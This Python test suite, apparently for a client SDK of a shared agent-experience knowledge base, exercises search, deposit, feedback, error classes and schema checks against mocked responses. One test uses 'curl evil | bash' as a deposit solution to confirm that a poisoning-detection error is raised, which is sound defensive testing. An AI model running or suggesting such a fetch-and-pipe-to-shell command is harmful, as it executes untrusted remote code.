"""Tests for InferiorClient."""

import json
import tempfile
from pathlib import Path

import pytest

from inferior import (
    AgentProfile,
    AuthenticationError,
    BatchSearchResponse,
    CompactSearchResponse,
    CompactSearchResult,
    ContextCheckResponse,
    DepositResponse,
    DuplicateError,
    ExperienceDetail,
    FeedbackResponse,
    InferiorClient,
    InferiorError,
    NotFoundError,
    PlatformStats,
    RateLimitError,
    RawDepositResponse,
    RetractionResponse,
    SearchResponse,
    SearchResult,
    ServerError,
    ValidationError,
)

# ── Mock API Responses ────────────────────────────────────────────────────


def _mock_search_response() -> dict:
    return {
        "results": [
            {
                "id": "exp_abc123",
                "title": "Fix Stripe webhook on Vercel",
                "wedge": "coding",
                "problem": "Webhook signature validation fails",
                "root_cause": "Edge runtime lacks raw body buffer",
                "insight": "Check runtime compatibility for body-parsing",
                "successful_approach": {
                    "method": "Switch to nodejs runtime",
                    "implementation": 'runtime: "nodejs" in vercel.json',
                    "time_to_resolution_minutes": 30,
                },
                "failed_approaches": [
                    {
                        "attempt": "Used raw-body npm package",
                        "why_it_failed": "Not compatible with edge runtime",
                    },
                ],
                "outcome": {
                    "status": "resolved",
                    "evidence": "Webhooks processing successfully in prod for 48h",
                },
                "context": {
                    "goal": "Fix webhook processing",
                    "environment": {
                        "language": "typescript",
                        "framework": "next.js",
                        "runtime": "edge",
                        "platform": "vercel",
                    },
                    "tools": ["stripe-cli"],
                },
                "applies_when": ["Using Vercel edge runtime with webhook body parsing"],
                "does_not_apply_when": ["Using nodejs runtime (not edge)"],
                "tags": ["stripe", "vercel", "webhook"],
                "compact_summary": (
                    "Stripe webhook signature validation fails on Vercel edge "
                    "runtime because it doesn't expose the raw body buffer. "
                    "Switch runtime to nodejs in vercel.json."
                ),
                "relevance": {
                    "combined_score": 0.87,
                    "semantic_score": 0.82,
                    "lexical_score": 0.65,
                    "structural_score": 0.90,
                    "fuzzy_score": 0.0,
                    "transferability_score": 0.75,
                    "contributor_reputation": 0.80,
                    "reranker_score": 0.0,
                    "matched_channels": ["semantic", "lexical", "structural"],
                },
                "transfer_warnings": [
                    {
                        "type": "env_mismatch",
                        "message": "Different framework version",
                        "matched_keywords": ["next.js"],
                    }
                ],
                "knowledge_source": "collective",
                "quality_score": 0.85,
                "version": 1,
                "created_at": "2026-03-15T10:30:00Z",
                "updated_at": "2026-03-15T10:30:00Z",
            }
        ],
        "total_results": 1,
        "metadata": {
            "processing_time_ms": 142,
            "embedding_model": "voyage-3",
            "cached": False,
            "channels_used": ["semantic", "lexical", "structural"],
            "query_understanding": {"search_expansion": ["webhook", "stripe"]},
        },
    }


def _mock_deposit_response() -> dict:
    return {
        "id": "exp_new456",
        "status": "created",
        "quality_score": 0.82,
        "trust_visibility": "searchable",
        "scan_summary": "Clean",
        "quality_breakdown": {"structural": 0.9, "semantic": 0.75},
    }


def _mock_raw_deposit_response() -> dict:
    return {
        "raw_deposit_id": "raw_abc123",
        "status": "accepted",
        "normalization_status": "queued",
        "trust_visibility": "pending",
        "message": "Raw deposit accepted and queued for normalization.",
    }


def _mock_feedback_response() -> dict:
    return {
        "feedback_id": "fbk_xyz789",
        "experience_id": "exp_abc123",
        "updated_scores": {"transferability_score": 0.82},
        "validity_update": {},
    }


# ── Context Manager ──────────────────────────────────────────────────────


class TestContextManager:
    def test_enter_exit(self):
        with InferiorClient(api_key="cw_full_test123456789012345678") as client:
            assert client.api_key == "cw_full_test123456789012345678"
        assert client.client.is_closed

    def test_close(self):
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        assert not client.client.is_closed
        client.close()
        assert client.client.is_closed


# ── Search ────────────────────────────────────────────────────────────────


class TestSearch:
    def test_search_returns_search_response(self, httpx_mock):
        httpx_mock.add_response(json=_mock_search_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        response = client.search("webhook")

        assert isinstance(response, SearchResponse)
        assert response.total_results == 1
        assert response.metadata.processing_time_ms == 142
        assert response.metadata.embedding_model == "voyage-3"
        assert response.metadata.query_understanding == {"search_expansion": ["webhook", "stripe"]}

        assert len(response.results) == 1
        r = response.results[0]
        assert isinstance(r, SearchResult)
        assert r.id == "exp_abc123"
        assert r.successful_approach.method == "Switch to nodejs runtime"
        assert len(r.failed_approaches) == 1
        assert r.relevance.combined_score == 0.87
        client.close()

    def test_search_compact_returns_compact_response(self, httpx_mock):
        httpx_mock.add_response(json=_mock_search_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        response = client.search("webhook", compact=True)

        assert isinstance(response, CompactSearchResponse)
        assert response.total_results == 1
        assert response.metadata.processing_time_ms == 142
        assert len(response.results) == 1
        r = response.results[0]
        assert isinstance(r, CompactSearchResult)
        assert r.relevance_score == 0.87

        request = httpx_mock.get_request()
        assert "compact=true" in str(request.url)
        client.close()

    def test_search_with_scope(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search("test", scope="self_first")

        request = httpx_mock.get_request()
        assert "scope=self_first" in str(request.url)
        client.close()

    def test_search_with_error_message(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search("test", error_message="ECONNREFUSED")

        request = httpx_mock.get_request()
        assert "error_message=ECONNREFUSED" in str(request.url)
        client.close()

    def test_search_with_your_conditions(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search("test", your_conditions={"framework": "fastapi"})

        request = httpx_mock.get_request()
        assert "your_conditions=" in str(request.url)
        client.close()

    def test_search_with_tags(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search("test", tags=["stripe", "vercel"])

        request = httpx_mock.get_request()
        assert "tags=stripe%2Cvercel" in str(request.url)
        client.close()

    def test_search_empty_results(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        response = client.search("nonexistent")
        assert response.results == []
        assert response.total_results == 0
        client.close()


# ── Deposit ───────────────────────────────────────────────────────────────


class TestDeposit:
    def test_deposit_returns_response(self, httpx_mock):
        httpx_mock.add_response(json=_mock_deposit_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.deposit(
            title="Test",
            problem="Problem",
            solution="Solution",
            root_cause="Cause",
            insight="Insight",
            tags=["test"],
        )
        assert isinstance(resp, DepositResponse)
        assert resp.id == "exp_new456"
        assert resp.quality_score == 0.82
        client.close()

    def test_deposit_payload_with_all_params(self, httpx_mock):
        httpx_mock.add_response(json=_mock_deposit_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit(
            title="Test",
            problem="Problem",
            solution="Solution",
            root_cause="Cause",
            insight="Insight",
            tags=["a"],
            implementation="code here",
            outcome_evidence="tests pass",
            outcome_side_effects="none",
            time_to_resolution_minutes=15,
            creation_mode="session",
        )

        request = httpx_mock.get_request()
        body = json.loads(request.content)
        assert body["successful_approach"]["method"] == "Solution"
        assert body["successful_approach"]["implementation"] == "code here"
        assert body["successful_approach"]["time_to_resolution_minutes"] == 15
        assert body["outcome"]["status"] == "resolved"
        assert body["outcome"]["evidence"] == "tests pass"
        assert body["outcome"]["side_effects"] == "none"
        assert body["creation_mode"] == "session"
        client.close()


# ── Raw Deposit ───────────────────────────────────────────────────────────


class TestDepositRaw:
    def test_deposit_raw_content(self, httpx_mock):
        httpx_mock.add_response(json=_mock_raw_deposit_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.deposit_raw(content="Error: connection refused. Fixed by starting postgres.")
        assert isinstance(resp, RawDepositResponse)
        assert resp.raw_deposit_id == "raw_abc123"

        request = httpx_mock.get_request()
        body = json.loads(request.content)
        assert "content" in body
        client.close()

    def test_deposit_raw_structured(self, httpx_mock):
        httpx_mock.add_response(json=_mock_raw_deposit_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit_raw(
            problem="Connection refused on port 5432",
            what_worked="systemctl start postgresql",
            context={"language": "python"},
            what_was_tried=[
                "restarted the app",
                {"attempt": "checked firewall", "why_it_failed": "ports were open"},
            ],
            outcome="resolved",
            root_cause="postgres not running",
            insight="Enable postgres on boot",
            tags=["postgres"],
            creation_mode="ci_hook",
        )

        request = httpx_mock.get_request()
        body = json.loads(request.content)
        assert body["problem"] == "Connection refused on port 5432"
        assert body["what_worked"] == "systemctl start postgresql"
        assert body["creation_mode"] == "ci_hook"
        assert len(body["what_was_tried"]) == 2
        client.close()

    def test_deposit_raw_requires_content_or_problem(self):
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(ValueError, match="content.*problem"):
            client.deposit_raw()
        client.close()

    def test_deposit_file(self, httpx_mock):
        httpx_mock.add_response(json=_mock_raw_deposit_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")

        with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
            f.write("ERROR Connection pool exhausted\nFixed by increasing pool_size")
            f.flush()
            resp = client.deposit_file(f.name, tags=["postgres"])

        assert isinstance(resp, RawDepositResponse)
        request = httpx_mock.get_request()
        assert "/v1/experiences/raw/file" in str(request.url)
        assert "multipart/form-data" in request.headers.get("content-type", "")

        Path(f.name).unlink()
        client.close()


# ── Feedback ──────────────────────────────────────────────────────────────


class TestFeedback:
    def test_feedback_basic(self, httpx_mock):
        httpx_mock.add_response(json=_mock_feedback_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.feedback("exp_abc123", was_helpful=True)

        assert isinstance(resp, FeedbackResponse)
        assert resp.feedback_id == "fbk_xyz789"
        assert resp.experience_id == "exp_abc123"
        assert resp.updated_scores == {"transferability_score": 0.82}
        client.close()

    def test_feedback_with_all_params(self, httpx_mock):
        httpx_mock.add_response(json=_mock_feedback_response())
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.feedback(
            "exp_abc123",
            was_helpful=True,
            helpfulness_detail="solved_directly",
            context_note="Worked perfectly in my FastAPI setup",
            time_saved_minutes=30,
            your_conditions={"framework": "fastapi", "language": "python"},
        )

        request = httpx_mock.get_request()
        body = json.loads(request.content)
        assert body["was_helpful"] is True
        assert body["helpfulness_detail"] == "solved_directly"
        assert body["context_note"] == "Worked perfectly in my FastAPI setup"
        assert body["time_saved_minutes"] == 30
        assert body["your_conditions"] == {"framework": "fastapi", "language": "python"}
        client.close()


# ── Auth & Config ─────────────────────────────────────────────────────────


class TestAuth:
    def test_bearer_token_sent(self, httpx_mock):
        httpx_mock.add_response(json={"results": [], "total_results": 0})
        client = InferiorClient(api_key="cw_full_mykey")
        client.search("test")

        request = httpx_mock.get_request()
        assert request.headers["authorization"] == "Bearer cw_full_mykey"
        client.close()

    def test_custom_base_url(self):
        client = InferiorClient(api_key="k", base_url="http://localhost:9000/")
        assert client.base_url == "http://localhost:9000"
        client.close()

    def test_custom_timeout(self):
        client = InferiorClient(api_key="k", timeout=30.0)
        assert client.client.timeout.read == 30.0
        client.close()


# ── Model Defaults ────────────────────────────────────────────────────────


class TestModels:
    def test_search_result_defaults(self):
        r = SearchResult()
        assert r.id == ""
        assert r.failed_approaches == []
        assert r.compact_summary is None
        assert r.relevance.combined_score == 0.0

    def test_compact_search_result_defaults(self):
        r = CompactSearchResult()
        assert r.relevance_score == 0.0
        assert r.transfer_warnings == []

    def test_deposit_response_defaults(self):
        d = DepositResponse(id="x", status="created", quality_score=0.5)
        assert d.trust_visibility == "pending"

    def test_raw_deposit_response_defaults(self):
        r = RawDepositResponse(raw_deposit_id="raw_x")
        assert r.status == "accepted"

    def test_feedback_response_defaults(self):
        f = FeedbackResponse(feedback_id="x")
        assert f.updated_scores == {}
        assert f.validity_update == {}


# ── Error Hierarchy ──────────────────────────────────────────────────────


class TestErrors:
    def test_401_raises_authentication_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=401,
            json={"error": "AuthenticationError", "message": "Invalid API key", "details": {}},
        )
        client = InferiorClient(api_key="bad_key")
        with pytest.raises(AuthenticationError) as exc_info:
            client.search("test")
        assert exc_info.value.status_code == 401
        client.close()

    def test_404_raises_not_found_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=404,
            json={
                "error": "NotFoundError",
                "message": "Experience not found",
                "details": {"resource_type": "experience", "resource_id": "exp_missing"},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(NotFoundError) as exc_info:
            client.get_experience("exp_missing")
        assert exc_info.value.details["resource_id"] == "exp_missing"
        client.close()

    def test_409_raises_duplicate_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=409,
            json={
                "error": "ExactDuplicateError",
                "message": "Duplicate",
                "details": {"existing_experience_id": "exp_existing"},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(DuplicateError) as exc_info:
            client.deposit(
                title="T", problem="P", solution="S", root_cause="R", insight="I", tags=["t"]
            )
        assert exc_info.value.existing_id == "exp_existing"
        client.close()

    def test_422_raises_validation_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=422,
            json={
                "error": "PIIDetectedError",
                "message": "PII detected",
                "details": {"findings": [{"type": "email"}]},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(ValidationError) as exc_info:
            client.deposit(
                title="T", problem="P", solution="S", root_cause="R", insight="I", tags=["t"]
            )
        assert exc_info.value.validation_type == "PIIDetectedError"
        client.close()

    def test_429_raises_rate_limit_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=429,
            json={
                "error": "RateLimitExceededError",
                "message": "Too many requests",
                "details": {"retry_after_seconds": 60, "scope": "deposit"},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(RateLimitError) as exc_info:
            client.deposit(
                title="T", problem="P", solution="S", root_cause="R", insight="I", tags=["t"]
            )
        assert exc_info.value.retry_after_seconds == 60
        assert exc_info.value.scope == "deposit"
        client.close()

    def test_502_raises_server_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=502,
            json={"error": "EmbeddingServiceError", "message": "Embedding failed", "details": {}},
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(ServerError):
            client.search("test")
        client.close()

    def test_unknown_status_raises_inferior_error(self, httpx_mock):
        httpx_mock.add_response(
            status_code=418, json={"error": "Teapot", "message": "I'm a teapot", "details": {}}
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(InferiorError):
            client.search("test")
        client.close()


# ── New Endpoints ────────────────────────────────────────────────────────


class TestGetExperience:
    def test_get_experience(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "id": "exp_abc",
                "title": "Test exp",
                "wedge": "coding",
                "problem": "Problem",
                "root_cause": "Cause",
                "insight": "Insight",
                "successful_approach": {"method": "Fix"},
                "failed_approaches": [{"attempt": "X", "why_it_failed": "Y"}],
                "outcome": {"status": "resolved"},
                "context": {"goal": "Fix bug", "environment": {"language": "python"}},
                "applies_when": ["condition A"],
                "tags": ["test"],
                "source": {"creation_mode": "structured"},
                "validity": {"status": "active"},
                "scores": {"retrieval_count": 5},
                "quality_score": 0.85,
                "version": 2,
                "created_at": "2026-04-01T00:00:00Z",
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        exp = client.get_experience("exp_abc")
        assert isinstance(exp, ExperienceDetail)
        assert exp.id == "exp_abc"
        assert exp.successful_approach.method == "Fix"
        assert len(exp.failed_approaches) == 1
        assert exp.context.environment.language == "python"
        assert exp.validity == {"status": "active"}
        assert exp.version == 2
        client.close()


class TestRetract:
    def test_retract_experience(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "id": "exp_abc",
                "status": "retracted",
                "retracted_at": "2026-04-06T00:00:00Z",
                "message": "Retracted",
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.retract_experience("exp_abc", reason="outdated")
        assert isinstance(resp, RetractionResponse)
        assert resp.status == "retracted"

        request = httpx_mock.get_request()
        body = json.loads(request.content)
        assert body["reason"] == "outdated"
        client.close()


class TestProfile:
    def test_get_profile(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "summary": "You're doing great",
                "overall_stats": {"total_searches": 10},
                "improvement_trend": {"trend": "improving"},
                "struggle_areas": [
                    {"domain": "database", "search_count": 5, "resolution_rate": 0.6}
                ],
                "expertise_areas": [],
                "recommendations": [],
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        profile = client.get_profile()
        assert isinstance(profile, AgentProfile)
        assert profile.summary == "You're doing great"
        assert profile.overall_stats["total_searches"] == 10
        assert len(profile.struggle_areas) == 1
        client.close()


class TestContextCheck:
    def test_context_check(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "task_domain": "database",
                "all_domains": ["database"],
                "warning_count": 1,
                "warnings": [
                    {
                        "description": "Pool exhaustion",
                        "why_it_fails": "Default pool too small",
                        "recommended_fix": "Increase pool_size",
                        "domain": "database",
                        "confidence": 0.85,
                        "relevance_score": 0.9,
                    }
                ],
                "recommended_experiences": [{"id": "exp_abc", "title": "Pool fix"}],
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.context_check("migrate database", tools=["sqlalchemy"])
        assert isinstance(resp, ContextCheckResponse)
        assert resp.task_domain == "database"
        assert len(resp.warnings) == 1
        assert resp.warnings[0].confidence == 0.85
        assert len(resp.recommended_experiences) == 1
        client.close()


class TestStats:
    def test_get_stats(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "total_experiences": 1247,
                "total_contributors": 89,
                "total_searches": 15832,
                "total_feedback_events": 2341,
                "top_tags": [{"tag": "postgres", "count": 89}],
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        stats = client.get_stats()
        assert isinstance(stats, PlatformStats)
        assert stats.total_experiences == 1247
        assert stats.top_tags[0]["tag"] == "postgres"
        client.close()


class TestBatchSearch:
    def test_batch_search(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "results": [
                    {
                        "results": [
                            {
                                "id": "exp_1",
                                "title": "Result 1",
                                "problem": "P",
                                "root_cause": "C",
                                "insight": "I",
                                "successful_approach": {"method": "M"},
                                "relevance": {
                                    "combined_score": 0.9,
                                    "semantic_score": 0.8,
                                    "lexical_score": 0.7,
                                    "structural_score": 0.6,
                                    "transferability_score": 0.5,
                                    "contributor_reputation": 0.4,
                                },
                            }
                        ],
                        "total_results": 1,
                        "metadata": {
                            "processing_time_ms": 50,
                            "embedding_model": "voyage-3",
                            "cached": False,
                        },
                    }
                ],
                "total_processing_time_ms": 55,
                "deduplicated_count": 0,
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.batch_search([{"q": "test query"}])
        assert isinstance(resp, BatchSearchResponse)
        assert resp.total_processing_time_ms == 55
        assert len(resp.results) == 1
        assert resp.results[0].results[0].id == "exp_1"


# ──────────────────────────────────────────────────────────────────────────
# Phase A–G coverage
# ──────────────────────────────────────────────────────────────────────────


class TestPhaseAScope:
    """Phase A: workspace scope on deposit + key creation."""

    def test_deposit_payload_includes_visibility_scope(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["body"] = json.loads(req.content)
            return _httpx.Response(
                200,
                json={
                    "id": "exp_scoped",
                    "status": "created",
                    "quality_score": 0.8,
                    "schema_version": "2.0.0",
                },
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit(
            title="t",
            problem="p",
            solution="s",
            root_cause="rc",
            insight="i",
            tags=["x"],
            failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
            visibility_scope="team",
        )
        assert captured["body"]["visibility_scope"] == "team"

    def test_deposit_default_visibility_scope_public(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["body"] = json.loads(req.content)
            return _httpx.Response(
                200, json={"id": "e", "status": "created", "quality_score": 0.8}
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit(
            title="t", problem="p", solution="s", root_cause="rc",
            insight="i", tags=["x"],
            failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
        )
        assert captured["body"]["visibility_scope"] == "public"

    def test_create_key_with_workspace_id(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["body"] = json.loads(req.content)
            return _httpx.Response(
                200,
                json={
                    "key_id": "key_x",
                    "api_key": "cw_full_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
                    "name": "team-key",
                    "scope": "deposit",
                    "workspace_id": "ws_alpha",
                    "contributor_id": "ctr_1",
                },
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.create_key(
            contributor_id="ctr_1",
            name="team-key",
            scope="deposit",
            workspace_id="ws_alpha",
        )
        assert captured["body"]["workspace_id"] == "ws_alpha"
        assert resp.workspace_id == "ws_alpha"


class TestPhaseBSchemaExtensions:
    """Phase B: env versions, evidence_class, dim scores."""

    def test_deposit_includes_evidence_class(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["body"] = json.loads(req.content)
            return _httpx.Response(200, json={"id": "e", "status": "created", "quality_score": 0.8})

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit(
            title="t", problem="p", solution="s", root_cause="rc", insight="i",
            tags=["x"],
            failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
            evidence_class="production_validated",
        )
        assert captured["body"]["outcome"]["evidence_class"] == "production_validated"

    def test_deposit_includes_env_versions(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["body"] = json.loads(req.content)
            return _httpx.Response(200, json={"id": "e", "status": "created", "quality_score": 0.8})

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.deposit(
            title="t", problem="p", solution="s", root_cause="rc", insight="i",
            tags=["x"],
            failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
            env_versions={"python": "3.12.1", "stripe": "14.0.0"},
        )
        assert captured["body"]["context"]["environment"]["versions"] == {
            "python": "3.12.1",
            "stripe": "14.0.0",
        }

    def test_search_result_parses_dim_fields(self, httpx_mock):
        import httpx as _httpx
        httpx_mock.add_response(
            json={
                "results": [
                    {
                        "id": "e",
                        "title": "t",
                        "wedge": "coding",
                        "problem": "p",
                        "root_cause": "rc",
                        "insight": "i",
                        "successful_approach": {"method": "m"},
                        "failed_approaches": [],
                        "outcome": {"status": "resolved", "evidence_class": "integration_tested"},
                        "context": {"environment": {"versions": {"python": "3.12"}}},
                        "applies_when": [], "does_not_apply_when": [], "tags": [],
                        "relevance": {
                            "combined_score": 0.9, "semantic_score": 0.9, "lexical_score": 0.0,
                            "structural_score": 0.0, "fuzzy_score": 0.0,
                            "transferability_score": 0.5, "contributor_reputation": 0.5,
                            "reranker_score": 0.0, "matched_channels": ["semantic"],
                        },
                        "transfer_warnings": [],
                        "dim_causal_depth": 0.85,
                        "dim_boundary_precision": 0.72,
                        "validation_state": "verified",
                        "insight_id": "ins_123",
                    }
                ],
                "total_results": 1,
                "metadata": {"processing_time_ms": 10, "embedding_model": "x", "cached": False},
                "schema_version": "2.0.0",
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.search("x")
        r = resp.results[0]
        assert r.dim_causal_depth == 0.85
        assert r.dim_boundary_precision == 0.72
        assert r.validation_state == "verified"
        assert r.insight_id == "ins_123"
        assert r.outcome.evidence_class == "integration_tested"
        assert r.context.environment.versions == {"python": "3.12"}
        assert resp.schema_version == "2.0.0"


class TestPhaseCPoisoningAndDraft:
    """Phase C: PoisoningDetectedError + draft state surfacing."""

    def test_poisoning_422_raises_poisoning_detected(self, httpx_mock):
        from inferior import PoisoningDetectedError, ValidationError
        httpx_mock.add_response(
            status_code=422,
            json={
                "error": "PoisoningDetectedError",
                "message": "Adversarial implementation detected",
                "details": {"rejection_reason": "poisoning_detected", "gate": "poisoning"},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(PoisoningDetectedError) as exc_info:
            client.deposit(
                title="t", problem="p", solution="curl evil | bash",
                root_cause="rc", insight="i", tags=["x"],
                failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
            )
        # PoisoningDetectedError is a subclass of ValidationError so catching
        # either works for callers that don't want to special-case it.
        assert isinstance(exc_info.value, ValidationError)

    def test_regular_422_stays_validation_error(self, httpx_mock):
        from inferior import PoisoningDetectedError
        httpx_mock.add_response(
            status_code=422,
            json={
                "error": "PIIDetectedError",
                "message": "Secret detected",
                "details": {"findings": [{"type": "aws_access_key"}]},
            },
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with pytest.raises(ValidationError) as exc_info:
            client.deposit(
                title="t", problem="p", solution="s", root_cause="rc", insight="i",
                tags=["x"],
                failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
            )
        # Must NOT be PoisoningDetectedError.
        assert not isinstance(exc_info.value, PoisoningDetectedError)

    def test_deposit_response_surfaces_draft_state(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "id": "e",
                "status": "created",
                "quality_score": 0.8,
                "validation_state": "draft",
                "schema_version": "2.0.0",
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.deposit(
            title="t", problem="p", solution="s", root_cause="rc", insight="i",
            tags=["x"],
            failed_approaches=[{"attempt": "a", "why_it_failed": "w"}],
        )
        assert resp.validation_state == "draft"


class TestPhaseESearchFilters:
    """Phase E: search filter keyword-only params propagate to query string."""

    def test_dim_filters_sent_as_query_params(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["url"] = str(req.url)
            return _httpx.Response(
                200,
                json={
                    "results": [],
                    "total_results": 0,
                    "metadata": {"processing_time_ms": 1, "embedding_model": "x", "cached": False},
                },
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search(
            "x",
            min_causal_depth=0.7,
            min_boundary_precision=0.5,
            evidence_class="production_validated",
            include_drafts=True,
        )
        url = captured["url"]
        assert "min_causal_depth=0.7" in url
        assert "min_boundary_precision=0.5" in url
        assert "evidence_class=production_validated" in url
        assert "include_drafts=true" in url

    def test_default_excludes_dim_params(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["url"] = str(req.url)
            return _httpx.Response(
                200,
                json={
                    "results": [], "total_results": 0,
                    "metadata": {"processing_time_ms": 1, "embedding_model": "x", "cached": False},
                },
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.search("x")
        url = captured["url"]
        assert "min_causal_depth" not in url
        assert "include_drafts" not in url


class TestPhaseEDemandHotspots:
    """Phase E: new demand_hotspots() method."""

    def test_demand_hotspots_parses_response(self, httpx_mock):
        from inferior import DemandResponse
        httpx_mock.add_response(
            json={
                "hotspots": [
                    {
                        "normalized_query": "abc123",
                        "unique_searches": 5,
                        "total_searches": 12,
                        "avg_top_score": 0.15,
                        "sample_domain": "coding",
                        "example_query": "how to deploy stripe webhook",
                    }
                ],
                "window_days": 7,
                "total_unmet_events": 12,
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.demand_hotspots(domain="coding", days=7)
        assert isinstance(resp, DemandResponse)
        assert resp.window_days == 7
        assert resp.total_unmet_events == 12
        assert len(resp.hotspots) == 1
        assert resp.hotspots[0].unique_searches == 5
        assert resp.hotspots[0].sample_domain == "coding"

    def test_demand_hotspots_sends_query_params(self, httpx_mock):
        captured: dict = {}

        def respond(req):
            import httpx as _httpx
            captured["url"] = str(req.url)
            return _httpx.Response(
                200, json={"hotspots": [], "window_days": 14, "total_unmet_events": 0}
            )

        httpx_mock.add_callback(respond)
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        client.demand_hotspots(domain="finance", days=14, max_top_score=0.2, limit=25)
        url = captured["url"]
        assert "domain=finance" in url
        assert "days=14" in url
        assert "max_top_score=0.2" in url
        assert "limit=25" in url


class TestPhaseGSchemaVersion:
    """Phase G: schema_version surfacing + mismatch warning."""

    def test_schema_version_surfaces_on_search_response(self, httpx_mock):
        httpx_mock.add_response(
            json={
                "results": [],
                "total_results": 0,
                "metadata": {"processing_time_ms": 1, "embedding_model": "x", "cached": False},
                "schema_version": "2.0.0",
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        resp = client.search("x")
        assert resp.schema_version == "2.0.0"

    def test_major_mismatch_emits_warning(self, httpx_mock):
        import warnings as _warnings
        from inferior import BackendSchemaMismatchWarning
        httpx_mock.add_response(
            json={
                "results": [],
                "total_results": 0,
                "metadata": {"processing_time_ms": 1, "embedding_model": "x", "cached": False},
                "schema_version": "3.0.0",  # Major mismatch
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with _warnings.catch_warnings(record=True) as caught:
            _warnings.simplefilter("always")
            client.search("x")
        assert any(issubclass(w.category, BackendSchemaMismatchWarning) for w in caught)

    def test_minor_mismatch_does_not_warn(self, httpx_mock):
        import warnings as _warnings
        from inferior import BackendSchemaMismatchWarning
        httpx_mock.add_response(
            json={
                "results": [],
                "total_results": 0,
                "metadata": {"processing_time_ms": 1, "embedding_model": "x", "cached": False},
                "schema_version": "2.3.1",  # Same major
            }
        )
        client = InferiorClient(api_key="cw_full_test123456789012345678")
        with _warnings.catch_warnings(record=True) as caught:
            _warnings.simplefilter("always")
            client.search("x")
        assert not any(issubclass(w.category, BackendSchemaMismatchWarning) for w in caught)
